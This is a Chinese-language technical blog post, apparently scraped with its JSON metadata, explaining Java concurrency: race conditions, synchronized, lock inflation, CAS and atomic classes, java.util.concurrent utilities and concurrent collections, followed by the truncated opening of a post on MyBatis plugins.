11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public class CounterTest { private static final long wait = 3000; private final long threads = 2; private final long times = 1000000; private final long excepted = threads * times; @Test public void testIncrement() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.increment(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertNotEquals(excepted, counter.value()); } private void startThreads(Counter counter, Runnable runnable) throws InterruptedException { for (int i = 0; i \u0026lt; threads; i++) { new Thread(runnable).start(); } Thread.sleep(CounterTest.wait); System.out.printf(\u0026#34;threadName: %s, exceptedCounterValue: %s, actualCounterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), excepted, counter.value()); } } 一个临时测试线程调用了 testIncrement 方法，启动了 2 个子线程，为了避免其中一个线程已经停止了，而另外一线程启动中，模拟了一个耗时任务，两个线程都要重复调用 Counter 的 increment 方法 1000000 次。注意，临时测试线程跳出循环后，会睡眠 3000 毫秒，才继续往下执行，预期结果为 2000000（子线程数与递增次数的乘积）。此处省略本机信息，测试结果如下：\n临时测试线程和两个子线程取得 count 的值都是错误的。根本原因是多线程并发访问共享变量或全局变量时，每个线程对该变量赋值前的值与它读取的值不一致，最终导致了程序错误。结合上面提到的 JVM 运行时的数据区域，可以推断出 Java 各种变量是否线程安全。\n变量 区域 是否线程共享 是否线程安全 实例字段（instance field） 堆 是 否 静态字段（static field） 堆 是 否 本地变量（local variable） 栈 否 是 Java 并发编程 锁 保证多线程并发访问共享资源的程序正确，有一个直观的解决方案——锁（Lock）。\n只有获得锁成功的线程才能进入临界区（critical section），访问共享资源。\n访问共享资源完成后，即使过程发生异常，也一定要释放锁，退出临界区。\n软件层的锁通常需要硬件层支持才能有效实现。这种支持通常采取一种或多种原子指令的形式，如 test-and-set、compare-and-swap、fetch-and-add。所谓原子指令，即处理器执行该指令不可分割且不可中断，换言之，原子操作要么完全发生，要么根本不发生。对于多处理器的计算机系统，为了保证原子性，甚至可能通过锁定总线，暂时禁止其它 CPU 与内存通信。\nsynchronized 以前文的计数器为例，新增一个用 synchronized 修饰的 incrementSyncMethod 方法到 Counter，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Counter { private long count; public void increment() { count++; } public synchronized void incrementSyncMethod() { count++; } public long value() { return count; } } 使用与测试 increment 方法相同的测试数据，测试启动相同个数的子线程重复调用同一个 Counter 对象的 incrementSyncMethod 方法相同次数，测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 @Test public void testIncrementSyncMethod() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.incrementSyncMethod(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); } 测试结果如下图所示：\n测试通过，期望值（exceptedCounterValue）与实际值（exceptedCounterValue）相等，其中一个子线程（Thread-1）与临时测试线程（Time-limited test）读取的 count 值相等。\n防止线程干扰和内存一致性错误的机制是同步（Synchronization）。关键字 synchronized，翻译为已同步。当只有一个线程调用一个同步方法，它会隐式获得该方法的对象的内置锁（intrinsic lock）或监视器锁（monitor lock），并在该方法返回时隐式释放该对象的内置锁（即使返回是由未捕获异常引起的）。如果是用 synchronized 修饰的静态方法，这个线程会获得该静态方法所属的类所关联的 Class 对象的内置锁，因此，通过不同于该类的任何实例的锁来控制对该类的静态字段的访问。\n这足以解释上面的两个线程读写同一个变量重复百万次，最后结果仍然正确的原因。两个线程调用同一个同步方法，一个线程快于另一个线程获得了这个方法的对象的内置锁，较慢的线程则被迫等待或被阻塞，已拥有该对象的内置锁的线程执行该方法的语句，更改共享实例字段，该方法返回时隐式释放了该对象的内置锁，另一个线程有机会拥有该对象的内置锁\u0026hellip;\u0026hellip;即使重复多次，一个时刻只能有一个线程正在访问共享实例字段，另一个线程被迫等待或被阻塞，也就是说这个两个线程对于共享实例字段的访问是互斥的，也就不会出现线程干扰和内存一致性错误。\n线程 1 线程 2 整数值 0 获得锁（成功） 0 获得锁（失败） 0 读取 \u0026lt;- 0 增加 0 写回 -\u0026gt; 1 释放锁 1 获得锁（成功） 1 读取 \u0026lt;- 1 增加 1 写回 -\u0026gt; 2 释放锁 2 编写同步代码的另一个方式是使用同步语句（Synchronized Statements），比如，改写一下测试方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void testIncrementSyncBlock() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { synchronized (counter) { counter.increment(); } } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); } 或者添加一个 incrementSyncStmt 方法到 Counter 类，以及新增对应的测试用例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class Counter { private long count; public void increment() { count++; } public synchronized void incrementSyncMethod() { count++; } public void incrementSyncStmt() { synchronized (this) { count++; } } public long value() { return count; } } 1 2 3 4 5 6 7 8 9 10 11 12 @Test public void testIncrementSyncStmt() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.incrementSyncStmt(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); } 采用同步语句需要显式指定一个提供内置锁的对象，同步语句建立临界区，多线程互斥访问该对象的状态（实例字段或静态字段）。\n膨胀 每一个 Java 对象都有一个与之关联的内置锁或监视器锁，其内部实体简称为监视器（monitor），又称为管程。因为有关键字 synchronized，所以每个 Java 对象都是一个潜在的监视器。一个线程可以锁定或解锁监视器，并且在任何时候只能有一个线程拥有该监视器。只有获得了监视器的所有权后，线程才可以进入受监视器保护的临界区。这与上文对内置锁的讨论一致，获得锁和释放锁可对应于 JVM 指令集的 monitorenter 和 monitorexit，即线程进入监视器和退出监视器。\n如果对 Counter.class 进行反汇编：\n1 javap -v target/classes/io/h2cone/concurrent/Counter.class 那么可以看到同步方法和同步语句的可视化字节码。\n同步方法虽然使用一个名为 ACC_SYNCHRONIZED 的 flag，但从 Java 虚拟机规范可以知道，底层行为也应该是进入监视器和退出监视器。\n在 Java Hostspot VM 中，每一个 Java 对象的内存布局都有一个通用的对象头（object header）～结构。对象头的第一个字是 mark word，第二字是 klass pointer。\nmark word。通常存储同步状态（synchronization state）和对象的 hash code。在 GC 期间，可能包含 GC 状态。\nklass pointer。指向另一个对象（元对象），该对象描述了原始对象的布局和行为。\n普通对象头一般有 2 个字（word），数组对象头一般有 3 个字（word）。\n锁的信息被编码在在对象头的 mark word，Mark word 最低两位的值（Tag）包含了对象的同步状态：\n未锁定/已解锁（Unlocked）。没有线程拥有该对象的锁。 轻量级已锁定（Light-weight locked）。某个线程拥有该对象的轻量级锁。 重量级已锁定（Heavy-weight locked）。某个线程拥有该对象的重量级锁。 有偏向/可偏向（Biased / Biasable）。该对象已偏向或可偏向于某线程。 下图描述了对象同步状态的转换，也是锁状态的转换。\n如果一个类的“可偏向”被禁用，该类的实例或对象的同步状态始于未锁定，即右手边。\n当一个线程调用该对象的同步方法或执行了指定该对象的同步语句，Mark word 副本和指向对象的指针存储在该线程当前栈帧（frame）内的锁记录（lock record）中。\nJVM 尝试通过 compare-and-swap（CAS）在该对象的 mark word 中安装一个指向锁记录的指针（pointer to lock record）。\n如果 CAS 操作成功，则该线程拥有了该对象的锁。该对象的 mark word 最后两位的值是 00。该锁称为轻量级锁。\n如果是递归或嵌套调用作用于该对象的同步代码，锁记录初始化为 0，而不是该对象的 mark word。 如果 CAS 操作失败，则说明该对象已被其它线程锁定成功。JVM 首先检测该对象的 mark word 是否指向当前线程的栈。\n当多个线程并发锁定同一个对象，且竞争足够激烈时，轻量级锁升为重量级锁。重量级锁就是监视器，监视器管理等待的线程。等待获得监视器的线程状态就是“线程状态”所说的阻塞。\nJVM 使用的监视器类型可能如上图所示，该监视器由三个房间组成。中间只有一个线程，即监视器所有者。在左侧，一个小房间包含了入口集（entry set）。在右侧，另一个小房间包含了等待集合（wait set）。那么如果此 Java 监视器未过时，被阻塞的线程更可能处于入口集，因为等待集中的线程状态是“线程状态”所说的等待。\n轻量级锁比重量级锁便宜很多，因为避免了操作系统互斥锁/条件变量（mutex / condition variables）与每个对象的联动。\n如果有多个线程并发锁定共享对象，获得轻量级锁失败的线程通常不会被阻塞或被迫等待，而是自旋若干次，尝试获得锁。HotSpot VM 使用高级自适应自旋技术（advanced adaptive spinning techniques）来提高程序吞吐量，即使是锁定共享对象竞争激烈的程序。\n如果一个类的“可偏向”已启用，该类的实例或对象的同步状态始于未锁定，且无偏向，即左手边。\n据说，获得轻量锁的 CAS 在多处理器计算机系统上可能引起较大延迟，也许大多数对象在其生命周期中最多只能被一个线程锁定。早在 Java 6，此问题试图通过偏向锁优化。\n该对象被第一个线程锁定时，只执行一次 CAS 操作，以将该线程 ID 记录到该对象的 mark word 中。于是该对象偏向于该线程。将来该线程对该对象的锁定和解锁无需任何原子操作或 mark word 的更新，甚至该线程栈中的锁记录也不会初始化。\n当一个线程锁定已偏向于另一个线程的对象，该对象的偏向会被撤销（此操作必须暂停所有线程）。一般由偏向锁转为轻量级锁。\n偏向锁的设计对一个线程重新获得锁更便宜和另一个线程获得锁更昂贵做了权衡：\n如果某个类的实例在过去频繁发生便偏向撤销，则该类将禁用“可偏向”。这个机制叫做批量撤销（bulk revocation）。\n如果一个类的实例被不同的线程锁定和解锁，且不是并发，则该类的实例被重置为已解锁且无偏向，但仍是可偏向的对象，因为该类的“可偏向”不会被禁用。这个机制叫做批量重置偏向（bulk rebiasing）。\n当然可以从一开始就禁用偏向锁，启动 HotSpot VM 时指定关闭 UseBiasedLocking：\n1 -XX:-UseBiasedLocking 对于一些程序，偏向锁弊大于利，例如 Cassandra 就禁用了它。\n简而言之，从 Java 6 开始就对 synchronized 做了不少优化，随着多线程锁定共享对象的竞争强度增大，锁的状态一般由偏向锁升为轻量级锁，竞争足够激烈时，则升为重量级锁，这个过程称为膨胀（inflate）。\n消除 在某些情况下，JVM 可以应用其它优化。例如，StringBuffer，它有很多同步方法。\n1 2 3 4 5 6 7 { StringBuffer sb = new StringBuffer(); sb.append(\u0026#34;foo\u0026#34;); sb.append(v); sb.append(\u0026#34;bar\u0026#34;); return sb.toString(); } 如上所示，语句在某方法体内，因为 sb 是本地变量，所以调用 append 方法可以省略锁，这叫做锁消除（lock elision）。\n粗化 1 2 3 4 5 { sb.append(\u0026#34;foo\u0026#34;); sb.append(v); sb.append(\u0026#34;bar\u0026#34;); } 再如上所示，如果 sb 是全局变量，且第一次 append 方法调用时已被某线程锁定成功，该线程可以避免 3 次锁定/解锁操作，而只需 1 次，这叫做锁粗化（lock coarsening）。\n死锁 死锁描述了线程等待获得自己或对方已拥有的锁的僵持状态。\n防止死锁的有效方案如下：\n设置线程尝试获得锁的超时时间。 每个线程尝试获得多个资源的锁的顺序必须一致。 比如上图，线程 1 和线程 2 都需要获得资源 1 和资源 2 的锁，只要每个线程尝试获得资源的锁的顺序是 (1，2)，也就不会是僵局。\n惯用锁 除了 synchronized，JDK 提供的 java.util.concurrent 包，富有参差多态的锁。\nReentrantLock ReentrantLock，可译为重入锁。重入（reentrant）是指一个线程可以再次拥有它已拥有且未释放的锁。通过上文“偏向锁和轻量级锁以及重量级锁”，可以知道内置锁是可重入锁。\n1 2 3 4 5 6 7 8 9 10 11 public class Foobar { public synchronized void doSomething() { System.out.println(\u0026#34;do something\u0026#34;); doOtherThings(); } public synchronized void doOtherThings() { System.out.println(\u0026#34;do other things\u0026#34;); } } 如上代码所示，当一个线程用 Foobar 对象调用 doSomething 方法，成功获得该对象的内置锁后，继续调用 doOther 方法时，假设内置锁不是重入锁，那么因为 doSomething 方法还未返回，所以该对象的内置锁还未自动释放，那么该线程将被迫无限期等待。\n或者断言该线程调用以下方法不会引起 java.lang.StackOverflowError 异常：\n1 2 3 4 5 6 public class Foobar { public synchronized void doSomething() { doSomething(); } } 事实证明，以上断言都是错的。ReentrantLock 的一般用法如下：\n1 final Lock lock = new ReentrantLock(); 1 2 3 4 5 6 lock.lock(); try { // critical section } finally { lock.unlock(); } 相比于 synchronized，Lock 要求显式锁定（lock）和解锁（unlock），因此要特别注意即使发生异常也要释放锁。如果不希望线程获得锁失败后等待机会而是继续前行或者需要返回结果，可以使用以下的方法：\nboolean tryLock();\nboolean tryLock(long time, TimeUnit unit) throws InterruptedException;\n一个典型的用法可能是这样的：\n1 2 3 4 5 6 7 8 9 if (lock.tryLock()) { try { // manipulate protected state } finally { lock.unlock(); } } else { // perform alternative actions } ReadWriteLock ReadWriteLock，“读读共享，读写（写读）互斥，写写互斥”。\n1 final ReadWriteLock readWriteLock = new ReentrantReadWriteLock(); 1 Lock readLock = readWriteLock.readLock(); 1 Lock writeLock = readWriteLock.writeLock(); readLock 和 writeLock 类似于共享锁和排他锁。\nSemaphore Semaphore，翻译为信号量，也可实现锁。\n1 final Semaphore semaphore = new Semaphore(3); 1 semaphore.acquire(); 1 semaphore.release(); 如上所示，在同一时刻，最多只能有 3 个线程获得锁成功。\n分类目录 下面这张图来自美团技术团队，描述了 Java 主流锁的分类目录：\n多线程竞争锁时，抢不到锁的线程，可能被迫等待（等待通知），或被阻塞（等待获得锁），抑或自旋。\n协调 CountDownLatch CountDownLatch，一个安全的且只能递减的计数器，支持一个线程等待多个线程完成任务后恢复执行。\n1 final CountDownLatch latch = new CountDownLatch(2); 下降：\n1 latch.countDown(); 等待：\n1 latch.await(3000, TimeUnit.MILLISECONDS); 如上所示，主线程调用 await 方法被迫等待，除非设置了超时时间，否则直到最后一个子线程完成任务后调用 countDown 方法把 latch 的次数减少为 0 时，才能继续前行。\nCyclicBarrier CyclicBarrier，调用 await 方法的线程被迫等待，直到给定数量的线程都到达“栅栏”，同时起跑。\n1 final CyclicBarrier barrier = new CyclicBarrier(8); 等待：\n1 barrier.await(); AQS 它们最亲近的父类是 AbstractQueuedSynchronizer。\n原子 保证多线程并发访问共享变量的程序正确，有另一个解决方案——原子操作。\n原子访问 在 Java 中，对以下变量的读取或写入都属于原子访问（atomic access）：\n引用类型的变量和大部分原始类型的变量（除了 long 和 double 的所有类型）。\n声明为 volatile 的所有变量（包括 long 和 double 变量）。\n原子访问是指不可分且不可中断的操作，原子访问要么完全发生，要么根本不发生。虽然单一原子访问避免了线程干扰，但是不代表一组原子访问可以防止内存一致性错误。\n使用 volatile 可降低内存一致性错误的风险，因为任何对 volatile 变量的写入都会与该变量的后续读取建立先发生在前的关系（happens-before relationship）。换言之，对 volatile 变量的更改始终对其它线程可见，即线程读取的 volatile 变量总是最新的。从 The Java Virtual Machine Specification, Java SE 8 Edition # 4.5. Fields 可以发现，ACC_VOLATILE 这个 flag 解释为 volatile 变量将永远不被 CPU 缓存。，只要 JVM 遵循了这个规范项，则线程只会从主存中读取而不是从其它高速缓存。volatile 另一个作用是避免指令重排导致线程对变量的更改不可见，因为现在的 HotSpot VM 默认开启了 JIT 编译器（Just-in-time compiler），在运行时 JIT 可能应用指令重排优化。\n回想前文所讨论的“非线程安全”中的计数器（Counter），非同步的“当前值加一”分解出来的三个步骤是原子访问，但是试验证明，出现了相互覆盖或丢失更改。由上一段可知，即使使用 volatile 修饰 Counter 的 count 字段，非同步的“当前值加一”仍然会出现内存一致性错误。\n到此为止，难道只能使用 synchronized 或 Java 锁防止线程干扰和内存一致性错误？然而并不是，还有一种 volatile 变量组合 CAS 循环的方案，其实前面”惯用锁“中所说的 ReentrantLock 的实现也使用了 CAS。\nCAS 在“锁”中第一次提到了 compare-and-swap 这个指令，而在“偏向锁和轻量级锁以及重量级锁”中也提到了 CAS。CAS 的实现通常需要硬件层的支持，甚至可能在硬件层见到类似于软件层的锁概念。\n现在用全新的 AtomicCounter 来代替那个混杂的 Counter。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class AtomicCounter { private AtomicLong count = new AtomicLong(0); public void increment() { long current, next; while (true) { current = count.get(); next = current + 1; if (count.compareAndSet(current, next)) { return; } } } public long value() { return count.get(); } } 使用 AtomicLong 代替 long，它维护了一个用 volatile 修饰的 long 字段。\n使用核心是 CAS 的方法（CAS 循环）代替使用 synchronized 的方法。\n其中新的 increment 方法的循环体内的前两个步骤和在 “非线程安全” 所分解的前两个步骤是一致的，第三个步骤是关键：\n1 count.compareAndSet(current, next) 当有多个线程并发调用 increment 方法，到了第三个步骤，某一个线程比较 count 绑定的字段与它前一次读取的 current 变量是否相等，如果相等，则把 count 绑定的字段的值设为 next 的值，increment 方法返回，如果不相等，则表明 count 绑定的字段已被其它线程更改，compareAndSet 方法返回 false，跳到第一步，继续尝试。竞争足够激烈时，相比于 synchronized，volatile 变量组合 CAS 循环是非阻塞方案。\ncompareAndSet 方法看似可分为两个步骤，实际上在底层，它是一个不可分且不可中断的原子指令，即从比较开始到赋值结束有且只有一个线程在执行此任务。该方法之所以可能返回 false，则是因为有可能一个线程赋值结束，与此同时，另一个线程开始比较。\n同样，也给 AtomicCounter 写测试类，这一次线程加一，次数加一百万。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public class AtomicCounterTest { private static final long wait = 3000; private final long threads = 3; private final long times = 2000000; private final long excepted = threads * times; @Test public void testIncrement() throws InterruptedException { AtomicCounter counter = new AtomicCounter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.increment(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); } private void startThreads(AtomicCounter counter, Runnable runnable) throws InterruptedException { for (int i = 0; i \u0026lt; threads; i++) { new Thread(runnable).start(); } Thread.sleep(AtomicCounterTest.wait); System.out.printf(\u0026#34;threadName: %s, exceptedCounterValue: %s, actualCounterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), excepted, counter.value()); } } 结果果然正确：\n事实上，JDK 已经提供了许多操作原子类型实例的原子方法，上文最新版的“当前值加一”方法过于啰嗦，实际开发中请直接使用原子类的 incrementAndGet 方法。翻阅源码可以知道，原子类的 compareAndSet 方法使用了 sun.misc.Unsafe 的 compareAndSwap 方法：\n1 2 3 4 5 public final native boolean compareAndSwapObject(Object var1, long var2, Object var4, Object var5); public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5); public final native boolean compareAndSwapLong(Object var1, long var2, long var4, long var6); 注意其中的 native，也就是说，下层的 compareAndSwap 函数由 C/C++ 实现，而 Java 程序可通过 JNI 调用这个函数。 虽然 JDK 没有包含 sun.misc.Unsafe 的源文件，但是通过对 Unsafe.class反编译，可以确定 incrementAndGet 方法同样使用了 CAS 函数，并且也使用 CAS 循环。\n1 2 3 public final long incrementAndGet() { return unsafe.getAndAddLong(this, valueOffset, 1L) + 1L; } 查看具体实现：\n1 2 3 4 5 6 7 8 public final long getAndAddLong(Object var1, long var2, long var4) { long var6; do { var6 = this.getLongVolatile(var1, var2); } while(!this.compareAndSwapLong(var1, var2, var6, var6 + var4)); return var6; } 注意，上文讨论的计数器在高并发场景中不一定是最优的方案，请看 LongAdder 和 LongAccumulator。\n原子类 这个 java.util.concurrent.atomic 包定义了支持对单个变量进行原子操作的类。\n值得注意的是，AtomicReference* 用于防止多线程并发操作引用类型实例出现线程干扰和内存一致性错误。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class LinkedList\u0026lt;Item\u0026gt; { private Node\u0026lt;Item\u0026gt; first; static class Node\u0026lt;Item\u0026gt; { Item item; Node\u0026lt;Item\u0026gt; next; } public void push(Item item) { Node\u0026lt;Item\u0026gt; oldFirst = first; first = new Node\u0026lt;\u0026gt;(); first.item = item; first.next = oldFirst; } } 如上所示，一个简略的链表（LinkedList），维护了一个首结点（first），push 方法用于在链表表头插入结点，当多线程并发调用同一个 LinkedList 实例的 push 方法时，它们存储了各自的老首结点（Node oldFirst = first;），它们新建了各自的新首结点（new Node\u0026lt;\u0026gt;();），然后把 first 指向各自的结点（first = new Node\u0026lt;\u0026gt;();），因为 first 是它们的共享变量，所以可能已经出现相互覆盖或丢失更改，更不用说后面了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class LinkedList\u0026lt;Item\u0026gt; { private Node\u0026lt;Item\u0026gt; first; static class Node\u0026lt;Item\u0026gt; { Item item; Node\u0026lt;Item\u0026gt; next; } public void push(Item item) { Node\u0026lt;Item\u0026gt; oldFirst = first; Node\u0026lt;Item\u0026gt; newFirst = new Node\u0026lt;\u0026gt;(); newFirst.item = item; newFirst.next = oldFirst; first = newFirst; } } 再如上所示，为了使问题清晰，只在 push 方法最后一步才设置 first。同样也因为 first 是它们的共享变量，所以它们都执行完最后一步后，可能出现一个或多个线程的新首结点游离于链表之外，因此，改用 CAS 方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class AtomicLinkedList\u0026lt;Item\u0026gt; { private AtomicReference\u0026lt;Node\u0026lt;Item\u0026gt;\u0026gt; first = new AtomicReference\u0026lt;\u0026gt;(); static class Node\u0026lt;Item\u0026gt; { Item item; Node\u0026lt;Item\u0026gt; next; } public void push(Item item) { Node\u0026lt;Item\u0026gt; newFirst = new Node\u0026lt;\u0026gt;(); newFirst.item = item; Node\u0026lt;Item\u0026gt; oldFirst; while (true) { oldFirst = first.get(); newFirst.next = oldFirst; if (first.compareAndSet(oldFirst, newFirst)) { return; } } } } 如果还实现了删除结点的方法，则要小心 ABA 问题，这时可考虑使用 AtomicStampedReference。\nCollections BlockingQueue 线程级的生产者-消费者问题的实质是分为生产者和消费者的两组线程共享同一个队列，消费者暂不能从队列拉取元素，除非队列非空，生产者暂不能推送元素到队列，除非队列非满。BlockingQueue 既有基于数组的实现，也有基于链表的实现，可用来解决生产者-消费者问题（比如 BlockingQueueDemo），当阻塞队列为空时，线程从阻塞队列拉取元素时会被阻塞或被迫等待，当阻塞队列已满时，线程推送元素到阻塞队列会被阻塞或被迫等待。\nLinkedBlockingDeque 和 ArrayBlockingQueue 均使用了 Condition，维护了队列非满条件变量和队列非空条件变量，如下图所示，通知的实现基于上文 \u0026ldquo;通知\u0026rdquo; 中提到的 park/unpark。\n本质上，Condition 实例与 Lock 实例绑定，通过 Lock 实例的 newCondition 方法可新建 Condition 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class BoundedBuffer { final Lock lock = new ReentrantLock(); final Condition notFull = lock.newCondition(); final Condition notEmpty = lock.newCondition(); final Object[] items = new Object[100]; int putptr, takeptr, count; public void put(Object x) throws InterruptedException { lock.lock(); try { while (count == items.length) notFull.await(); items[putptr] = x; if (++putptr == items.length) putptr = 0; ++count; notEmpty.signal(); } finally { lock.unlock(); } } public Object take() throws InterruptedException { lock.lock(); try { while (count == 0) notEmpty.await(); Object x = items[takeptr]; if (++takeptr == items.length) takeptr = 0; --count; notFull.signal(); return x; } finally { lock.unlock(); } } } ConcurrentMap ConcurrentMap 是 Map 的子接口，它定义了有用的原子操作，例如，仅在键存在时才删除或替换键值对，或仅在键不存在时才添加键值对，其中一个标准实现是 ConcurrentHashMap，它是 HashMap 的线程安全版本。\nJDK 7 的 HashMap 是基于拉链法的散列表。\n如上面这张来自 algs4 的图所示，散列表是一种符号表（symbol table），符号表是一种存储键值对的数据结构，支持两种操作：\n插入（put）。查找给定的键是否命中，若命中，则更新对应的值，若未命中，则插入键值对。\n查找（get）。通过给定的键得到相应的值。\n基于拉链法的散列表维护了元素类型是链表的数组，它的查找算法可分为两步：\n使用 Hash 函数将给定的键转化为数组的索引。\n在链表中查找给定的键，返回对应的值。\n如下面这张来自 Java HashMap internals 的图所示，在 HashMap 中，数组元素称为 bucket 或 bin，链表结点称为 entry。\nJDK 8 在 HashMap 中引入红黑树以优化查找算法。当一个桶的大小（链表大小）大于等于树化阈值（TREEIFY_THRESHOLD）且桶的数量（数组长度）大于等于 64，该桶将转化为一颗红黑树，当一个桶的大小小于等于解树阈值（TREEIFY_THRESHOLD），该桶将转化为链表。说到红黑二叉查找树，不得不先说二叉查找树和 2-3 查找树，未来将开启 HashMap 的新篇章。\n翻阅源码可以知道，例如 ConcurrentHashMap#put 方法，ConcurrentHashMap 使用 CAS 和 synchronized 防止多线程并发访问它维护的链表或红黑树时出现线程干扰和内存一致性错误。\n一成不变 如果一个共享对象的状态只读，就不存在线程干扰和内存一致性错误，而且只要尝试改写状态时，每次都新建不同状态的这种对象并返回，完美制造了状态可变的假象（想象一下手翻书），也就不存在线程安全问题。这种对象，被称为不可变对象（Immutable Objects）。定义不可变对象的策略，可参考 A Strategy for Defining Immutable Objects。\n《The Joy of Clojure, second-edition》，1.4. Why Clojure isn’t especially object-oriented，作者对不可变的和可变的做了很棒的类比。\n后记 单机可以运行数百万个 Go 协程（Goroutine），却只能运行数千个 Java 线程。现在的 Java HotSpot VM，默认一个 Java 线程占有 1 M 的栈（以前是 256K），而且是大小固定的栈，而 Go 协程的栈是大小可变的栈，即随着存储的数据量变化而变化，并且初始值仅为 4 KB。确实，运行过多的 Java 线程容易导致 out of memory，而且 Java 线程与内核线程（原生线程）是 1:1 映射，那么过多线程的上下文切换也会引起应用程序较大延迟；Go 协程与内核线程（原生线程）是多对一映射，Go 实现了自己的协程调度器，实际上要运行数百万个协程，Go 需要做得事情要复杂得多。\n若只讨论 Java 单体应用承受高并发的场景，即使扩大线程池也不能显著提高性能或适得其反，相反，少量的线程就能处理更多的连接，比如，Netty。如果仍然认为重量级的 Java 线程是瓶颈，并且还想使用 Java 的话，不妨尝试 Quasar，它是一个提供纤程和类似于 Go 的 Channel 以及类似于 Erlang 的 Actor 的 Java 库。\n虽然进程之间不一定共享本机资源，但是线程之间的同步可以推广到进程之间的同步，比如，分布式锁。分布式系统中，代码一致的多个进程可能共享同一个数据库，数据库支持并发控制，比如，共享锁和排他锁以及 MVCC。\n文中代码 部分代码已发布，可查看 concurrent。\n本文首发于 https://h2cone.github.io\n吸收更多 深入理解计算机系统（原书第3版）\nThread (computing)\n~jbell/CourseNotes/OperatingSystems/4_Threads\nImplementing threads :: Operating systems 2018\nHotSpot Runtime Overview # Thread Management\nJVM中的线程模型是用户级的么？\nHow Java thread maps to OS thread\nHotSpot JVM internal threads\nJava Tutorials # Concurrency # Guarded Blocks\nThread pool\nJava Tutorials # Concurrency # Thread Pools\nJava Tutorials # Concurrency # Fork/Join\nFork–join model\nGuide To CompletableFuture\nJava Tutorials # Collections # Streams # Parallelism\nJava Tutorials # Concurrency # Synchronization\nThe Java Language Specification, Java SE 8 Edition # Chapter 17. Threads and Locks\nHotSpot Runtime Overview # Synchronization\nOpenJDK Wiki # HotSpot # Synchronization and Object Locking\nThe Java Virtual Machine Specification, Java SE 8 Edition # 2.11.10. Synchronization\nThe Hotspot Java Virtual Machine by Paul Hohensee\n【死磕Java并发】\u0026mdash;\u0026ndash;深入分析synchronized的实现原理\nLock Lock Lock: Enter!\nInside the Java Virtual Machine by Bill Venners # Thread Synchronization\nBiased Locking in HotSpot\nHotSpotGlossary\nLock (computer science)\nMutual exclusion\nSynchronization (computer science)\nMonitor (synchronization)\nUnderstand the object internally\n单例模式\u0026ndash;双重检验锁真的线程安全吗\nKnow Thy Java Object Memory Layout\n【基本功】不可不说的Java“锁”事\n码农翻身：用故事给技术加点料\nJava Tutorials # Concurrency # Atomic Access\nJava Tutorials # Concurrency # Atomic Variables\n聊聊并发（五）——原子操作的实现原理\nJava Tutorials # Concurrency\n唯品会 Java 开发手册 (九) 并发处理\nWhy you can have millions of Goroutines but only thousands of Java Threads\nJava中的纤程库 - Quasar\n继续了解Java的纤程库 - Quasar\nThe actor model in 10 minutes - Brian Storti\n","date":"2020-02-21T17:47:30+08:00","permalink":"https://h2cone.github.io/2020/02/21/thread_concurrent/","title":"多线程·并发编程"},{"content":"插件 我们早已知道 MyBatis 自身支持客户端分页（RowBounds）, 即从数据库获取全部目标数据，在内存中对结果集进行分页，虽然适用于不同数据库，但是数据量足够大时 Java 程序可能发生内存溢出；若采用数据库服务器端分页，即从数据库获取部分目标数据，例如向 MySQL 数据库发送使用了 LIMIT 或 OFFSET关键词的 SQL，还挺简单，可是直接使用 MyBatis 做数据库分页仍然有一些痛点：\n重复编写分页、求总记录数、排序语句。\n语法不同，不适用于其它数据库。\n那不如改用 Hibernate ？还真不一定，国人偏爱 MyBatis，以至于使用插件来增强 MyBatis，比如 Mybatis-PageHelper，一个通用的 MyBatis 分页插件。想不到 MyBatis 还挺灵活，支持插件机制。仔细翻阅官方文档可以确定 MyBatis 允许你在 Mapper 执行过程中的某些点拦截调用，已经知晓动态代理的朋友们（参见切面和动态代理以及字节码），彷佛看透了 MyBatis 插件。\n默认情况下，MyBatis 允许插件拦截以下方法的调用：\nClasses Methods Executor update, query, flushStatements, commit, rollback, getTransaction, close, isClosed ParameterHandler getParameterObject, setParameters ResultSetHandler handleResultSets, handleOutputParameters StatementHandler prepare, parameterize, batch, update, query 顾名思义，MyBatis 不愧为 SQL 映射框架。这些重要的组件共同参与了 MyBatis 一般的工作流程：\n示例插件 编写一个插件，只需要实现 org.apache.ibatis.plugin.Interceptor 接口，指定你要拦截的方法签名。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Intercepts({ @Signature( type = Executor.class, method = 